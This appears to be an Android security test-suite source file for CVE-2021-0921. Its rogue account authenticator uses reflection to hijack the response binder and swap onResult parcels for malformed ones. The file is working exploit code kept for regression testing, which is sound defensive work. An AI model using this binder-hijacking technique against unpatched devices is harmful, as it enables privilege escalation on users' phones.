package android.security.cts.CVE_2021_0921;

import android.accounts.AbstractAccountAuthenticator;
import android.accounts.Account;
import android.accounts.AccountAuthenticatorResponse;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.IBinder;
import android.os.IInterface;
import android.os.Parcel;
import android.os.RemoteException;
import android.util.Log;

import java.io.FileDescriptor;
import java.lang.reflect.Field;

public class Authenticator extends AbstractAccountAuthenticator {
    public static Intent mIntent;
    private int TRANSACTION_onResult;
    private IBinder mOriginRemote;
    private static final String TAG = "TAG_2021_0921.Authenticator";
    private IBinder mProxyRemote = new IBinder() {
        @Override
        public String getInterfaceDescriptor() throws RemoteException {
            return null;
        }

        @Override
        public boolean pingBinder() {
            return false;
        }

        @Override
        public boolean isBinderAlive() {
            return false;
        }

        @Override
        public IInterface queryLocalInterface(String descriptor) {
            return null;
        }

        @Override
        public void dump(FileDescriptor fd, String[] args) throws RemoteException {
        }

        @Override
        public void dumpAsync(FileDescriptor fd, String[] args) throws RemoteException {
        }

        @Override
        public boolean transact(int code, Parcel data, Parcel reply, int flags) throws RemoteException {
            Log.d(TAG, "transact() start");
            if (code == TRANSACTION_onResult) {
                Log.d(TAG, "transact() before parse");
                data.recycle();
                data = GenMalformedParcel.parsingPackageImplParcel(mIntent);
                Log.d(TAG, "transact() end parse");
            }
            Log.d(TAG, "transact() continue");
            mOriginRemote.transact(code, data, reply, flags);
            Log.d(TAG, "transact() end");
            return true;
        }

        @Override
        public void linkToDeath(DeathRecipient recipient, int flags) throws RemoteException {
        }

        @Override
        public boolean unlinkToDeath(DeathRecipient recipient, int flags) {
            return false;
        }
    };

    public Authenticator(Context context) {
        super(context);
        Log.d(TAG, "Authenticator() constructor");
    }

    @Override
    public String getAuthTokenLabel(String authTokenType) {
        return null;
    }

    @Override
    public Bundle editProperties(AccountAuthenticatorResponse response, String accountType) {
        return null;
    }

    @Override
    public Bundle getAuthToken(AccountAuthenticatorResponse response, Account account,
                               String authTokenType, Bundle options) {
        return null;
    }

    @Override
    public Bundle addAccount(AccountAuthenticatorResponse response, String accountType,
                             String authTokenType, String[] requiredFeatures, Bundle options) {

        Log.d(TAG, "addAccount() start");
        try {
            Class AccountAuthenticatorResponseClass = Class.forName("android.accounts.AccountAuthenticatorResponse");
            @SuppressLint("SoonBlockedPrivateApi")
            Field mAccountAuthenticatorResponseField = AccountAuthenticatorResponseClass.getDeclaredField("mAccountAuthenticatorResponse");
            mAccountAuthenticatorResponseField.setAccessible(true);
            Object mAccountAuthenticatorResponse = mAccountAuthenticatorResponseField.get(response);

            Class stubClass = null;
            for (Class inner : Class.forName("android.accounts.IAccountAuthenticatorResponse").getDeclaredClasses()) {
                if (inner.getCanonicalName().equals("android.accounts.IAccountAuthenticatorResponse.Stub")) {
                    stubClass = inner;
                    break;
                }
            }

            Field TRANSACTION_onResultField = stubClass.getDeclaredField("TRANSACTION_onResult");
            TRANSACTION_onResultField.setAccessible(true);
            TRANSACTION_onResult = TRANSACTION_onResultField.getInt(null);

            Class proxyClass = null;
            for (Class inner : stubClass.getDeclaredClasses()) {
                if (inner.getCanonicalName().equals("android.accounts.IAccountAuthenticatorResponse.Stub.Proxy")) {
                    proxyClass = inner;
                    break;
                }
            }

            Field mRemoteField = proxyClass.getDeclaredField("mRemote");
            mRemoteField.setAccessible(true);
            mOriginRemote = (IBinder) mRemoteField.get(mAccountAuthenticatorResponse);
            mRemoteField.set(mAccountAuthenticatorResponse, mProxyRemote);
        } catch (Exception e) {
            e.printStackTrace();
        }
        Log.d(TAG, "addAccount() end");

        return new Bundle();
    }

    @Override
    public Bundle confirmCredentials(AccountAuthenticatorResponse response, Account account, Bundle options) {
        return null;
    }

    @Override
    public Bundle updateCredentials(AccountAuthenticatorResponse response, Account account, String authTokenType, Bundle options) {
        return null;
    }

    @Override
    public Bundle hasFeatures(AccountAuthenticatorResponse response, Account account, String[] features) {
        return null;
    }
}
